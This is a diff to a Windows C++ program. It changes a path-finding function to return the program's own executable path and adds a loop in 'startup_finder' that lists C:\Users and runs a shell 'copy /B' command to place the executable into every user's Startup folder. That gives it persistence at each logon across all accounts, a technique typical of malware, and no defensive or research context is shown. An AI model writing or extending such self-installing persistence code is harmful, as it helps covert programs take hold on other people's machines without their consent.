@@ -94,7 +94,7 @@ void remover(std::vector<std::string>& v) {
  *a character in the alphabet
  */
 int matcher(char firstletter) {
-	std::string alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+	std::string alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\\._:0123456789";
 	int res = alphabet.find(firstletter);
 
 	return res;
@@ -128,29 +128,28 @@ std::string parser(const std::string res, std::vector<std::string> v) {
 /*
  *Finds the current path of the program
  */
-int find_curr_dir() {
+std::string find_curr_dir() {
 	char Path[FILENAME_MAX];
+	std::string exePath = "";
 
 	//Will contain exe path
 	HMODULE hmodule = GetModuleHandle(NULL);
 	if (hmodule != NULL) {
 		//When passing NULL to GetModuleHandle, it returns handle of exe itself
 		GetModuleFileName(hmodule, (LPTSTR) Path, (sizeof(Path)));
-		std::string exePath = "";
-		///////////////////////////PARSE ARRAY///////////////////////
+		
+		//Parses the Character array
 		for (int i = 0; i < 260; i++) {
-			if (Path[i] != NULL) {
+			if (matcher(Path[i]) != -1) {
 				exePath += Path[i];
 			}
 		}
-		/////////////////////////////////////////////////////////////
-		std::cout << exePath << std::endl;
 	}
 	else {
 		std::cout << "Module handle is NULL" << std::endl;
 	}
 
-	return 0;
+	return exePath;
 }
 
 /*
@@ -160,6 +159,9 @@ int find_curr_dir() {
 int startup_finder() {
 	const char* cmd = "dir C:\\Users";
 	char buffer[128];
+	std::string start = "C:\\Users\\";
+	std::string end = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+	std::string exePath = find_curr_dir();
 	std::string result = "";
 	std::vector<std::string> parts;
 	std::vector<std::string> folder;
@@ -176,21 +178,21 @@ int startup_finder() {
 	_pclose(_pipe);
 
 	
+	///////////////////////syntax of command incorrect error/////////////////////////
 	result = parser(result, parts);
 	split(result, ' ', parts);
 	for (int i = 0; i < parts.size(); i++) {
 		int rest = matcher(parts[i][0]);
 		if (rest != -1) {
 			folder.push_back(parts[i]);
+			if (parts[i].find('.') == -1) {
+				std::string startup_dir = "copy /B " + exePath + " " + start + parts[i] + end;
+				std::cout << startup_dir << std::endl;
+				int i = system(startup_dir.c_str());
+			}
 		}
 	}
-
-	//could use COPY windows command here
-	std::string start = "C:\\Users\\";
-	std::string end = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\try_3.exe";
-	find_curr_dir();
-	std::string startup_dir = "copy /B" + start + result + end;
-	//int i = system("dir");
+	//////////////////////////////////////////////////////////////////////////////////
 
 	return 0;
 }
